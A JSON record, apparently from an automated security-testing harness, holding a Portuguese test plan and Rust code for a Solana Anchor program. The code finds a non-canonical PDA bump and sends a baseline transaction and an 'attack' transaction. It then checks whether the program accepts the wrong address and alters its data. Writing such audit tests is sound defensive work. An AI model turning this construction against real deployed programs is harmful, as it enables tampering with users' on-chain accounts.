attempts.raw:
{
  "plan": "O programa set_value verifica que data_account é o PDA canônico derivado de [b"data", user.key] e grava user, value e bump. O baseline usa o PDA canônico e deve ter sucesso. O ataque tenta passar um endereço de PDA com bump não canônico (menor que o canônico) para verificar se a validação de PDA é feita corretamente. O efeito medido é que a conta com endereço diferente do PDA canônico foi aceita e teve seus dados alterados.",
  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Encontrar um bump não canônico (menor que o canônico) para o qual create_program_address retorna Ok
let mut non_canonical_bump = canonical_bump - 1;
let mut non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
while non_canonical_pda.is_err() && non_canonical_bump > 0 {
    non_canonical_bump -= 1;
    non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
}
let non_canonical_pda = non_canonical_pda.unwrap();

// Conta do PDA canônico com dados iniciais (para o baseline)
let data_account_data = anchor_account_data("DataAccount", &(user, 0u64, canonical_bump));
let data_account = account(&env.program_id, &data_account_data, None);

// Conta do PDA não canônico com os mesmos dados iniciais (para o ataque)
let non_canonical_data_account_data = anchor_account_data("DataAccount", &(user, 0u64, non_canonical_bump));
let non_canonical_data_account = account(&env.program_id, &non_canonical_data_account_data, None);

// Conta do usuário (signer)
let user_account = wallet(1_000_000_000);

// Baseline: usar o PDA canônico
let baseline_ix = env.anchor_ix(
    "set_value",
    &(42u64,),
    vec![
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let baseline_accounts = vec![
    (canonical_pda, data_account.clone()),
    (user, user_account.clone()),
];
let baseline_result = env.baseline("uso legitimo com PDA canonico", &baseline_ix, &baseline_accounts);

// Ataque: usar o PDA não canônico
let attack_ix = env.anchor_ix(
    "set_value",
    &(42u64,),
    vec![
        AccountMeta::new(non_canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let attack_accounts = vec![
    (non_canonical_pda, non_canonical_data_account),
    (user, user_account),
];
let attack_result = env.attack("tentativa com PDA nao canonico", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let data = after(&attack_result, &non_canonical_pda).data();
    let stored_user = read_pubkey(data, 8);
    let stored_value = read_u64(data, 40);
    let stored_bump = data[48];
    env.effect(
        "PDA nao canonico aceito e dados alterados",
        stored_user == user && stored_value == 42 && stored_bump == non_canonical_bump,
    );
}"
}

